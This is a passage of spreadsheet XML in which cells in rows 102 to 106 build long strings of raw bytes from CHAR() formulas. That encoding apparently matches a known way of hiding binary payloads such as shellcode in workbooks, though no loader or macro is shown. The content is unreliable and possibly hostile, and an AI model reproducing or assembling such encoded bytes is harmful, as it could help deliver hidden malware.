&amp;CHAR(79)&amp;CHAR(3)&amp;CHAR(135)&amp;CHAR(202)&amp;CHAR(113)&amp;CHAR(4)&amp;CHAR(141)&amp;CHAR(4)&amp;CHAR(86)&amp;CHAR(253)&amp;CHAR(82)&amp;CHAR(13)&amp;CHAR(132)&amp;CHAR(120)&amp;CHAR(13)&amp;CHAR(137)&amp;CHAR(8)&amp;CHAR(141)&amp;CHAR(197)&amp;CHAR(113)&amp;CHAR(3)&amp;CHAR(142)&amp;CHAR(7)&amp;CHAR(80)&amp;CHAR(236)&amp;CHAR(82)&amp;CHAR(1)&amp;CHAR(140)&amp;CHAR(61)&amp;CHAR(82)&amp;CHAR(85)&amp;CHAR(206)&amp;CHAR(142)&amp;CHAR(69)&amp;CHAR(34)&amp;CHAR(6)&amp;CHAR(128)&amp;CHAR(199)&amp;CHAR(26)&amp;CHAR(246)&amp;CHAR(254)&amp;CHAR(1)&amp;CHAR(130)&amp;CHAR(7)&amp;CHAR(199)&amp;CHAR(21)&amp;CHAR(2)&amp;CHAR(186)&amp;CHAR(8)&amp;CHAR(74)&amp;CHAR(6)&amp;CHAR(137)&amp;CHAR(192)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(189)&amp;CHAR(4)&amp;CHAR(73)&amp;CHAR(2)&amp;CHAR(131)&amp;CHAR(203)&amp;CHAR(21)&amp;CHAR(4)&amp;CHAR(179)&amp;CHAR(3)&amp;CHAR(68)&amp;CHAR(11)&amp;CHAR(134)&amp;CHAR(197)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(133)&amp;CHAR(66)&amp;CHAR(39)&amp;CHAR(14)&amp;CHAR(254)&amp;CHAR(117)&amp;CHAR(35)&amp;CHAR(26)&amp;CHAR(252)&amp;CHAR(113)&amp;CHAR(41)&amp;CHAR(18)&amp;CHAR(142)&amp;CHAR(71)&amp;CHAR(10)&amp;CHAR(253)&amp;CHAR(113)&amp;CHAR(41)&amp;CHAR(18)&amp;CHAR(89)&amp;CHAR(137)&amp;CHAR(14)&amp;CHAR(247)&amp;CHAR(93)&amp;CHAR(45)&amp;CHAR(201)&amp;CHAR(29)&amp;CHAR(6)&amp;CHAR(185)&amp;CHAR(18)&amp;CHAR(66)&amp;CHAR(9)&amp;CHAR(133)&amp;CHAR(193)&amp;CHAR(25)&amp;CHAR(11)&amp;CHAR(90)&amp;CHAR(142)&amp;CHAR(125)&amp;CHAR(34)&amp;CHAR(22)&amp;CHAR(134)&amp;CHAR(248)&amp;CHAR(127)&amp;CHAR(1)&amp;CHAR(185)&amp;CHAR(2)&amp;CHAR(73)&amp;CHAR(7)&amp;CHAR(133)&amp;CHAR(250)&amp;CHAR(20)&amp;CHAR(84)&amp;CHAR(130)&amp;CHAR(126)&amp;CHAR(34)&amp;CHAR(5)&amp;CHAR(137)&amp;CHAR(67)&amp;CHAR(10)&amp;CHAR(85)&amp;CHAR(142)&amp;CHAR(1)&amp;CHAR(253)&amp;CHAR(82)&amp;CHAR(13)&amp;CHAR(142)&amp;CHAR(66)&amp;CHAR(3)&amp;CHAR(139)&amp;CHAR(3)&amp;CHAR(56)&amp;CHAR(198)&amp;CHAR(89)&amp;CHAR(88)&amp;CHAR(192)&amp;CHAR(30)&amp;CHAR(6)&amp;CHAR(136)&amp;CHAR(78)&amp;CHAR(37)&amp;CHAR(9)&amp;CHAR(130)&amp;CHAR(194)&amp;CHAR(118)&amp;CHAR(2)&amp;CHAR(181)&amp;CHAR(5)&amp;CHAR(69)&amp;CHAR(7)&amp;CHAR(130)&amp;CHAR(233)&amp;CHAR(13)&amp;CHAR(202)&amp;CHAR(6)&amp;CHAR(8)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(8)&amp;CHAR(63)&amp;CHAR(197)&amp;CHAR(201)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(84)&amp;CHAR(152)&amp;CHAR(238)&amp;CHAR(246)&amp;CHAR(112)&amp;CHAR(43)&amp;CHAR(134)&amp;CHAR(78)&amp;CHAR(5)&amp;CHAR(250)&amp;CHAR(116)&amp;CHAR(34)&amp;CHAR(253)&amp;CHAR(118)&amp;CHAR(39)&amp;CHAR(129)&amp;CHAR(78)&amp;CHAR(9)&amp;CHAR(254)&amp;CHAR(124)&amp;CHAR(27)&amp;CHAR(250)&amp;CHAR(100)&amp;CHAR(26)&amp;CHAR(137)&amp;CHAR(24)&amp;CHAR(245)&amp;CHAR(115)&amp;CHAR(5)&amp;CHAR(82)</f>
        <v>_x0008_Tü]_x0003_„{_x0011_L_x000F_‚Ãr_x0008_Š_x0008_VúA
‹w_x0006_G
€Ëq_x0017_‚_x0003_RöU(€D_x000C_[_x000F_øS_x0006_}_x0002_ŠO_x0003_‡Êq_x0004__x0004_VýR_x000D_„x_x000D_‰_x0008_Åq_x0003_Ž_x0007_PìR_x0001_Œ=RUÎŽE"_x0006_€Ç_x001A_öþ_x0001_‚_x0007_Ç_x0015__x0002_º_x0008_J_x0006_‰À	_x0002_½_x0004_I_x0002_ƒË_x0015__x0004_³_x0003_D_x000B_†Å_x000F__x0002_…B'_x000E_þu#_x001A_üq)_x0012_ŽG
ýq)_x0012_Y‰_x000E_÷]-É_x001D__x0006_¹_x0012_B	…Á_x0019__x000B_ZŽ}"_x0016_†ø_x0001_¹_x0002_I_x0007_…ú_x0014_T‚~"_x0005_‰C
UŽ_x0001_ýR_x000D_ŽB_x0003_‹_x0003_8ÆYXÀ_x001E__x0006_ˆN%	‚Âv_x0002_µ_x0005_E_x0007_‚é_x000D_Ê_x0006__x0008__x0002__x0006__x0008_?ÅÉ_x000D__x0006_T˜îöp+†N_x0005_út"ýv'N	þ|_x001B_úd_x001A_‰_x0018_õs_x0005_R</v>
      </c>
      <c r="C102" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(192)&amp;CHAR(179)&amp;CHAR(68)&amp;CHAR(42)&amp;CHAR(148)&amp;CHAR(254)&amp;CHAR(200)</f>
        <v>ÖÈ!À³D*”þÈ</v>
      </c>
    </row>
    <row r="103" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B103" t="str">
        <f>CHAR(84)&amp;CHAR(253)&amp;CHAR(87)&amp;CHAR(41)&amp;CHAR(84)&amp;CHAR(192)&amp;CHAR(39)&amp;CHAR(9)&amp;CHAR(86)&amp;CHAR(82)&amp;CHAR(92)&amp;CHAR(234)&amp;CHAR(70)&amp;CHAR(4)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(140)&amp;CHAR(118)&amp;CHAR(42)&amp;CHAR(18)&amp;CHAR(186)&amp;CHAR(25)&amp;CHAR(31)&amp;CHAR(65)&amp;CHAR(7)&amp;CHAR(189)&amp;CHAR(231)&amp;CHAR(47)&amp;CHAR(77)&amp;CHAR(6)&amp;CHAR(46)&amp;CHAR(200)&amp;CHAR(1)&amp;CHAR(202)&amp;CHAR(142)&amp;CHAR(11)&amp;CHAR(143)&amp;CHAR(1)&amp;CHAR(234)&amp;CHAR(33)&amp;CHAR(7)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(178)&amp;CHAR(224)&amp;CHAR(28)&amp;CHAR(65)&amp;CHAR(19)&amp;CHAR(41)&amp;CHAR(198)&amp;CHAR(6)&amp;CHAR(203)&amp;CHAR(134)&amp;CHAR(13)&amp;CHAR(132)&amp;CHAR(77)&amp;CHAR(5)&amp;CHAR(238)&amp;CHAR(22)&amp;CHAR(12)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(191)&amp;CHAR(157)&amp;CHAR(31)&amp;CHAR(73)&amp;CHAR(7)&amp;CHAR(46)&amp;CHAR(222)&amp;CHAR(1)&amp;CHAR(202)&amp;CHAR(130)&amp;CHAR(12)&amp;CHAR(143)&amp;CHAR(65)&amp;CHAR(10)&amp;CHAR(237)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(187)&amp;CHAR(89)&amp;CHAR(18)&amp;CHAR(69)&amp;CHAR(4)&amp;CHAR(32)&amp;CHAR(205)&amp;CHAR(7)&amp;CHAR(195)&amp;CHAR(141)&amp;CHAR(1)&amp;CHAR(142)&amp;CHAR(74)&amp;CHAR(2)&amp;CHAR(238)&amp;CHAR(237)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(190)&amp;CHAR(50)&amp;CHAR(24)&amp;CHAR(69)&amp;CHAR(13)&amp;CHAR(45)&amp;CHAR(202)&amp;CHAR(4)&amp;CHAR(202)&amp;CHAR(137)&amp;CHAR(3)&amp;CHAR(132)&amp;CHAR(78)&amp;CHAR(25)&amp;CHAR(234)&amp;CHAR(221)&amp;CHAR(6)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(178)&amp;CHAR(9)&amp;CHAR(29)&amp;CHAR(65)&amp;CHAR(19)&amp;CHAR(41)&amp;CHAR(198)&amp;CHAR(6)&amp;CHAR(203)&amp;CHAR(134)&amp;CHAR(13)&amp;CHAR(132)&amp;CHAR(77)&amp;CHAR(21)&amp;CHAR(238)&amp;CHAR(202)&amp;CHAR(13)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(191)&amp;CHAR(117)&amp;CHAR(26)&amp;CHAR(73)&amp;CHAR(7)&amp;CHAR(46)&amp;CHAR(222)&amp;CHAR(1)&amp;CHAR(202)&amp;CHAR(130)&amp;CHAR(12)&amp;CHAR(143)&amp;CHAR(65)&amp;CHAR(26)&amp;CHAR(237)&amp;CHAR(183)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(187)&amp;CHAR(114)&amp;CHAR(27)&amp;CHAR(69)&amp;CHAR(4)&amp;CHAR(32)&amp;CHAR(205)&amp;CHAR(7)&amp;CHAR(195)&amp;CHAR(141)&amp;CHAR(1)&amp;CHAR(142)&amp;CHAR(74)&amp;CHAR(18)&amp;CHAR(238)&amp;CHAR(161)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(190)&amp;CHAR(6)&amp;CHAR(24)&amp;CHAR(69)&amp;CHAR(13)&amp;CHAR(45)&amp;CHAR(202)&amp;CHAR(4)&amp;CHAR(202)&amp;CHAR(137)&amp;CHAR(3)&amp;CHAR(132)&amp;CHAR(78)&amp;CHAR(41)&amp;CHAR(234)&amp;CHAR(137)&amp;CHAR(6)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(178)&amp;CHAR(1)&amp;CHAR(29)&amp;CHAR(65)&amp;CHAR(19)&amp;CHAR(41)&amp;CHAR(198)&amp;CHAR(6)&amp;CHAR(203)&amp;CHAR(134)&amp;CHAR(13)&amp;CHAR(132)&amp;CHAR(77)&amp;CHAR(37)&amp;CHAR(238)&amp;CHAR(126)&amp;CHAR(13)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(191)&amp;CHAR(5)&amp;CHAR(26)&amp;CHAR(73)&amp;CHAR(7)&amp;CHAR(46)&amp;CHAR(222)&amp;CHAR(1)&amp;CHAR(202)&amp;CHAR(130)&amp;CHAR(12)&amp;CHAR(143)&amp;CHAR(65)&amp;CHAR(42)&amp;CHAR(237)&amp;CHAR(107)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(187)&amp;CHAR(7)&amp;CHAR(18)&amp;CHAR(69)&amp;CHAR(4)&amp;CHAR(32)&amp;CHAR(205)&amp;CHAR(7)&amp;CHAR(195)&amp;CHAR(141)&amp;CHAR(1)&amp;CHAR(142)&amp;CHAR(74)&amp;CHAR(34)&amp;CHAR(238)&amp;CHAR(85)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(190)&amp;CHAR(6)&amp;CHAR(24)</f>
        <v>TýW)TÀ'	VR\êF_x0004__x0006__x0007_Œv*_x0012_º_x0019__x001F_A_x0007_½ç/M_x0006_.È_x0001_ÊŽ_x000B__x0001_ê!_x0007__x000C__x0005_²à_x001C_A_x0013_)Æ_x0006_Ë†_x000D_„M_x0005_î_x0016__x000C__x0007_
¿_x001F_I_x0007_.Þ_x0001_Ê‚_x000C_A
í_x0003_
_x0005_	»Y_x0012_E_x0004_ Í_x0007_Ã_x0001_ŽJ_x0002_îí_x0004__x0001__x0001_¾2_x0018_E_x000D_-Ê_x0004_Ê‰_x0003_„N_x0019_êÝ_x0006__x000C__x0005_²	_x001D_A_x0013_)Æ_x0006_Ë†_x000D_„M_x0015_îÊ_x000D__x0007_
¿u_x001A_I_x0007_.Þ_x0001_Ê‚_x000C_A_x001A_í·_x000B__x0005_	»r_x001B_E_x0004_ Í_x0007_Ã_x0001_ŽJ_x0012_î¡_x0004__x0001__x0001_¾_x0006__x0018_E_x000D_-Ê_x0004_Ê‰_x0003_„N)ê‰_x0006__x000C__x0005_²_x0001__x001D_A_x0013_)Æ_x0006_Ë†_x000D_„M%î~_x000D__x0007_
¿_x0005__x001A_I_x0007_.Þ_x0001_Ê‚_x000C_A*ík_x000B__x0005_	»_x0007__x0012_E_x0004_ Í_x0007_Ã_x0001_ŽJ"îU_x0004__x0001__x0001_¾_x0006__x0018_</v>
      </c>
      <c r="C103" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(179)&amp;CHAR(78)&amp;CHAR(252)&amp;CHAR(57)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(237)</f>
        <v>!¥³Nü9ÖÈ!í</v>
      </c>
    </row>
    <row r="104" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B104" t="str">
        <f>CHAR(69)&amp;CHAR(13)&amp;CHAR(45)&amp;CHAR(202)&amp;CHAR(4)&amp;CHAR(202)&amp;CHAR(137)&amp;CHAR(3)&amp;CHAR(132)&amp;CHAR(78)&amp;CHAR(57)&amp;CHAR(234)&amp;CHAR(69)&amp;CHAR(6)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(178)&amp;CHAR(129)&amp;CHAR(24)&amp;CHAR(65)&amp;CHAR(19)&amp;CHAR(41)&amp;CHAR(198)&amp;CHAR(6)&amp;CHAR(203)&amp;CHAR(134)&amp;CHAR(13)&amp;CHAR(132)&amp;CHAR(77)&amp;CHAR(53)&amp;CHAR(238)&amp;CHAR(50)&amp;CHAR(13)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(191)&amp;CHAR(5)&amp;CHAR(26)&amp;CHAR(73)&amp;CHAR(7)&amp;CHAR(46)&amp;CHAR(222)&amp;CHAR(1)&amp;CHAR(202)&amp;CHAR(130)&amp;CHAR(12)&amp;CHAR(143)&amp;CHAR(65)&amp;CHAR(58)&amp;CHAR(237)&amp;CHAR(31)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(187)&amp;CHAR(7)&amp;CHAR(18)&amp;CHAR(69)&amp;CHAR(4)&amp;CHAR(32)&amp;CHAR(205)&amp;CHAR(7)&amp;CHAR(195)&amp;CHAR(141)&amp;CHAR(1)&amp;CHAR(142)&amp;CHAR(74)&amp;CHAR(50)&amp;CHAR(238)&amp;CHAR(9)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(190)&amp;CHAR(6)&amp;CHAR(24)&amp;CHAR(69)&amp;CHAR(13)&amp;CHAR(45)&amp;CHAR(202)&amp;CHAR(4)&amp;CHAR(202)&amp;CHAR(137)&amp;CHAR(3)&amp;CHAR(132)&amp;CHAR(78)&amp;CHAR(73)&amp;CHAR(234)&amp;CHAR(241)&amp;CHAR(5)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(178)&amp;CHAR(1)&amp;CHAR(29)&amp;CHAR(65)&amp;CHAR(19)&amp;CHAR(41)&amp;CHAR(198)&amp;CHAR(6)&amp;CHAR(203)&amp;CHAR(134)&amp;CHAR(13)&amp;CHAR(132)&amp;CHAR(77)&amp;CHAR(69)&amp;CHAR(238)&amp;CHAR(230)&amp;CHAR(14)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(191)&amp;CHAR(5)&amp;CHAR(26)&amp;CHAR(73)&amp;CHAR(7)&amp;CHAR(46)&amp;CHAR(222)&amp;CHAR(1)&amp;CHAR(202)&amp;CHAR(130)&amp;CHAR(12)&amp;CHAR(143)&amp;CHAR(65)&amp;CHAR(74)&amp;CHAR(237)&amp;CHAR(211)&amp;CHAR(8)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(187)&amp;CHAR(7)&amp;CHAR(18)&amp;CHAR(69)&amp;CHAR(4)&amp;CHAR(32)&amp;CHAR(205)&amp;CHAR(7)&amp;CHAR(195)&amp;CHAR(141)&amp;CHAR(1)&amp;CHAR(142)&amp;CHAR(74)&amp;CHAR(66)&amp;CHAR(238)&amp;CHAR(189)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(190)&amp;CHAR(6)&amp;CHAR(24)&amp;CHAR(69)&amp;CHAR(13)&amp;CHAR(45)&amp;CHAR(202)&amp;CHAR(4)&amp;CHAR(202)&amp;CHAR(137)&amp;CHAR(3)&amp;CHAR(132)&amp;CHAR(78)&amp;CHAR(89)&amp;CHAR(234)&amp;CHAR(173)&amp;CHAR(5)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(178)&amp;CHAR(249)&amp;CHAR(28)&amp;CHAR(65)&amp;CHAR(19)&amp;CHAR(41)&amp;CHAR(198)&amp;CHAR(6)&amp;CHAR(203)&amp;CHAR(134)&amp;CHAR(13)&amp;CHAR(132)&amp;CHAR(77)&amp;CHAR(85)&amp;CHAR(238)&amp;CHAR(154)&amp;CHAR(14)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(191)&amp;CHAR(5)&amp;CHAR(26)&amp;CHAR(73)&amp;CHAR(7)&amp;CHAR(46)&amp;CHAR(222)&amp;CHAR(1)&amp;CHAR(202)&amp;CHAR(130)&amp;CHAR(12)&amp;CHAR(143)&amp;CHAR(65)&amp;CHAR(90)&amp;CHAR(237)&amp;CHAR(135)&amp;CHAR(8)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(187)&amp;CHAR(43)&amp;CHAR(18)&amp;CHAR(69)&amp;CHAR(4)&amp;CHAR(32)&amp;CHAR(205)&amp;CHAR(7)&amp;CHAR(195)&amp;CHAR(141)&amp;CHAR(1)&amp;CHAR(142)&amp;CHAR(74)&amp;CHAR(82)&amp;CHAR(238)&amp;CHAR(113)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(190)&amp;CHAR(6)&amp;CHAR(24)&amp;CHAR(69)&amp;CHAR(13)&amp;CHAR(45)&amp;CHAR(202)&amp;CHAR(4)&amp;CHAR(202)&amp;CHAR(137)&amp;CHAR(3)&amp;CHAR(132)&amp;CHAR(78)&amp;CHAR(105)&amp;CHAR(234)&amp;CHAR(89)&amp;CHAR(5)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(178)&amp;CHAR(169)&amp;CHAR(24)&amp;CHAR(65)&amp;CHAR(19)&amp;CHAR(41)&amp;CHAR(198)&amp;CHAR(6)&amp;CHAR(203)&amp;CHAR(134)&amp;CHAR(13)</f>
        <v>E_x000D_-Ê_x0004_Ê‰_x0003_„N9êE_x0006__x000C__x0005_²_x0018_A_x0013_)Æ_x0006_Ë†_x000D_„M5î2_x000D__x0007_
¿_x0005__x001A_I_x0007_.Þ_x0001_Ê‚_x000C_A:í_x001F__x000B__x0005_	»_x0007__x0012_E_x0004_ Í_x0007_Ã_x0001_ŽJ2î	_x0004__x0001__x0001_¾_x0006__x0018_E_x000D_-Ê_x0004_Ê‰_x0003_„NIêñ_x0005__x000C__x0005_²_x0001__x001D_A_x0013_)Æ_x0006_Ë†_x000D_„MEîæ_x000E__x0007_
¿_x0005__x001A_I_x0007_.Þ_x0001_Ê‚_x000C_AJíÓ_x0008__x0005_	»_x0007__x0012_E_x0004_ Í_x0007_Ã_x0001_ŽJBî½_x0007__x0001__x0001_¾_x0006__x0018_E_x000D_-Ê_x0004_Ê‰_x0003_„NYê­_x0005__x000C__x0005_²ù_x001C_A_x0013_)Æ_x0006_Ë†_x000D_„MUîš_x000E__x0007_
¿_x0005__x001A_I_x0007_.Þ_x0001_Ê‚_x000C_AZí‡_x0008__x0005_	»+_x0012_E_x0004_ Í_x0007_Ã_x0001_ŽJRîq_x0007__x0001__x0001_¾_x0006__x0018_E_x000D_-Ê_x0004_Ê‰_x0003_„NiêY_x0005__x000C__x0005_²©_x0018_A_x0013_)Æ_x0006_Ë†_x000D_</v>
      </c>
      <c r="C104" t="str">
        <f>CHAR(112)&amp;CHAR(221)&amp;CHAR(91)&amp;CHAR(249)&amp;CHAR(93)&amp;CHAR(196)&amp;CHAR(4)&amp;CHAR(141)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>pÝ[ù]Ä_x0004_ûÏ</v>
      </c>
    </row>
    <row r="105" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B105" t="str">
        <f>CHAR(132)&amp;CHAR(77)&amp;CHAR(101)&amp;CHAR(238)&amp;CHAR(78)&amp;CHAR(14)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(191)&amp;CHAR(245)&amp;CHAR(27)&amp;CHAR(73)&amp;CHAR(7)&amp;CHAR(46)&amp;CHAR(222)&amp;CHAR(1)&amp;CHAR(202)&amp;CHAR(130)&amp;CHAR(12)&amp;CHAR(143)&amp;CHAR(65)&amp;CHAR(106)&amp;CHAR(237)&amp;CHAR(59)&amp;CHAR(8)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(187)&amp;CHAR(7)&amp;CHAR(18)&amp;CHAR(69)&amp;CHAR(4)&amp;CHAR(32)&amp;CHAR(205)&amp;CHAR(7)&amp;CHAR(195)&amp;CHAR(141)&amp;CHAR(1)&amp;CHAR(142)&amp;CHAR(74)&amp;CHAR(98)&amp;CHAR(238)&amp;CHAR(37)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(190)&amp;CHAR(6)&amp;CHAR(24)&amp;CHAR(69)&amp;CHAR(13)&amp;CHAR(45)&amp;CHAR(202)&amp;CHAR(4)&amp;CHAR(202)&amp;CHAR(137)&amp;CHAR(3)&amp;CHAR(132)&amp;CHAR(78)&amp;CHAR(121)&amp;CHAR(234)&amp;CHAR(21)&amp;CHAR(5)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(178)&amp;CHAR(1)&amp;CHAR(29)&amp;CHAR(65)&amp;CHAR(19)&amp;CHAR(143)&amp;CHAR(87)&amp;CHAR(1)&amp;CHAR(40)&amp;CHAR(194)&amp;CHAR(128)&amp;CHAR(113)&amp;CHAR(33)&amp;CHAR(17)&amp;CHAR(5)&amp;CHAR(202)&amp;CHAR(136)&amp;CHAR(1)&amp;CHAR(89)&amp;CHAR(143)&amp;CHAR(73)&amp;CHAR(117)&amp;CHAR(132)&amp;CHAR(128)&amp;CHAR(217)&amp;CHAR(18)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(138)&amp;CHAR(108)&amp;CHAR(22)&amp;CHAR(9)&amp;CHAR(82)&amp;CHAR(140)&amp;CHAR(124)&amp;CHAR(17)&amp;CHAR(250)&amp;CHAR(94)&amp;CHAR(122)&amp;CHAR(134)&amp;CHAR(201)&amp;CHAR(112)&amp;CHAR(23)&amp;CHAR(128)&amp;CHAR(9)&amp;CHAR(137)&amp;CHAR(77)&amp;CHAR(14)&amp;CHAR(87)&amp;CHAR(138)&amp;CHAR(133)&amp;CHAR(130)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(81)&amp;CHAR(138)&amp;CHAR(22)&amp;CHAR(83)&amp;CHAR(252)&amp;CHAR(87)&amp;CHAR(21)&amp;CHAR(89)&amp;CHAR(91)&amp;CHAR(92)&amp;CHAR(193)&amp;CHAR(137)&amp;CHAR(81)&amp;CHAR(41)&amp;CHAR(10)&amp;CHAR(140)&amp;CHAR(208)&amp;CHAR(115)&amp;CHAR(15)&amp;CHAR(180)&amp;CHAR(6)&amp;CHAR(75)&amp;CHAR(5)&amp;CHAR(134)&amp;CHAR(234)&amp;CHAR(76)&amp;CHAR(81)&amp;CHAR(130)&amp;CHAR(89)&amp;CHAR(39)&amp;CHAR(1)&amp;CHAR(56)&amp;CHAR(196)&amp;CHAR(83)&amp;CHAR(138)&amp;CHAR(114)&amp;CHAR(38)&amp;CHAR(15)&amp;CHAR(80)&amp;CHAR(129)&amp;CHAR(120)&amp;CHAR(21)&amp;CHAR(138)&amp;CHAR(141)&amp;CHAR(136)&amp;CHAR(249)&amp;CHAR(18)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(50)&amp;CHAR(14)&amp;CHAR(141)&amp;CHAR(124)&amp;CHAR(10)&amp;CHAR(68)&amp;CHAR(129)&amp;CHAR(252)&amp;CHAR(1)&amp;CHAR(124)&amp;CHAR(236)&amp;CHAR(232)&amp;CHAR(35)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(128)&amp;CHAR(134)&amp;CHAR(139)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(57)&amp;CHAR(10)&amp;CHAR(141)&amp;CHAR(118)&amp;CHAR(2)&amp;CHAR(64)&amp;CHAR(130)&amp;CHAR(254)&amp;CHAR(6)&amp;CHAR(118)&amp;CHAR(235)&amp;CHAR(230)&amp;CHAR(18)&amp;CHAR(54)&amp;CHAR(206)&amp;CHAR(137)&amp;CHAR(134)&amp;CHAR(138)&amp;CHAR(129)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(61)&amp;CHAR(12)&amp;CHAR(135)&amp;CHAR(112)&amp;CHAR(7)&amp;CHAR(68)&amp;CHAR(133)&amp;CHAR(248)&amp;CHAR(23)&amp;CHAR(119)&amp;CHAR(231)&amp;CHAR(140)&amp;CHAR(49)&amp;CHAR(62)&amp;CHAR(203)&amp;CHAR(230)&amp;CHAR(13)&amp;CHAR(130)&amp;CHAR(36)&amp;CHAR(2)&amp;CHAR(187)&amp;CHAR(5)&amp;CHAR(74)&amp;CHAR(6)&amp;CHAR(129)&amp;CHAR(94)&amp;CHAR(87)&amp;CHAR(92)&amp;CHAR(199)&amp;CHAR(29)&amp;CHAR(2)&amp;CHAR(137)&amp;CHAR(77)&amp;CHAR(46)&amp;CHAR(2)&amp;CHAR(99)&amp;CHAR(2)&amp;CHAR(111)&amp;CHAR(2)&amp;CHAR(111)&amp;CHAR(248)&amp;CHAR(130)</f>
        <v>„MeîN_x000E__x0007_
¿õ_x001B_I_x0007_.Þ_x0001_Ê‚_x000C_Ají;_x0008__x0005_	»_x0007__x0012_E_x0004_ Í_x0007_Ã_x0001_ŽJbî%_x0007__x0001__x0001_¾_x0006__x0018_E_x000D_-Ê_x0004_Ê‰_x0003_„Nyê_x0015__x0005__x000C__x0005_²_x0001__x001D_A_x0013_W_x0001_(Â€q!_x0011__x0005_Êˆ_x0001_YIu„€Ù_x0012__x0002__x0002_Šl_x0016_	RŒ|_x0011_ú^z†Ép_x0017_€	‰M_x000E_WŠ…‚_x0002__x0003_
QŠ_x0016_SüW_x0015_Y[\Á‰Q)
ŒÐs_x000F_´_x0006_K_x0005_†êLQ‚Y'_x0001_8ÄSŠr&amp;_x000F_Px_x0015_Šˆù_x0012__x0002__x0002_2_x000E_|
Dü_x0001_|ìè#6Í€†‹_x0007__x0002__x0007__x0007_9
v_x0002_@‚þ_x0006_vëæ_x0012_6Î‰†Š_x0002_	_x0002_=_x000C_‡p_x0007_D…ø_x0017_wçŒ1&gt;Ëæ_x000D_‚$_x0002_»_x0005_J_x0006_^W\Ç_x001D__x0002_‰M._x0002_c_x0002_o_x0002_oø‚</v>
      </c>
      <c r="C105" t="str">
        <f>CHAR(62)&amp;CHAR(249)&amp;CHAR(85)&amp;CHAR(9)&amp;CHAR(89)&amp;CHAR(237)&amp;CHAR(112)&amp;CHAR(198)&amp;CHAR(193)&amp;CHAR(33)</f>
        <v>&gt;ùU	YípÆÁ!</v>
      </c>
    </row>
    <row r="106" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B106" t="str">
        <f>CHAR(66)&amp;CHAR(15)&amp;CHAR(89)&amp;CHAR(142)&amp;CHAR(12)&amp;CHAR(244)&amp;CHAR(83)&amp;CHAR(60)&amp;CHAR(56)&amp;CHAR(198)&amp;CHAR(197)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(133)&amp;CHAR(74)&amp;CHAR(39)&amp;CHAR(14)&amp;CHAR(130)&amp;CHAR(201)&amp;CHAR(248)&amp;CHAR(242)&amp;CHAR(12)&amp;CHAR(196)&amp;CHAR(76)&amp;CHAR(22)&amp;CHAR(77)&amp;CHAR(197)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(142)&amp;CHAR(73)&amp;CHAR(34)&amp;CHAR(13)&amp;CHAR(253)&amp;CHAR(114)&amp;CHAR(44)&amp;CHAR(4)&amp;CHAR(142)&amp;CHAR(75)&amp;CHAR(17)&amp;CHAR(249)&amp;CHAR(81)&amp;CHAR(95)&amp;CHAR(49)&amp;CHAR(201)&amp;CHAR(199)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(136)&amp;CHAR(225)&amp;CHAR(17)&amp;CHAR(82)&amp;CHAR(141)&amp;CHAR(94)&amp;CHAR(39)&amp;CHAR(27)&amp;CHAR(95)&amp;CHAR(80)&amp;CHAR(86)&amp;CHAR(50)&amp;CHAR(246)&amp;CHAR(138)&amp;CHAR(174)&amp;CHAR(89)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(137)&amp;CHAR(189)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(142)&amp;CHAR(206)&amp;CHAR(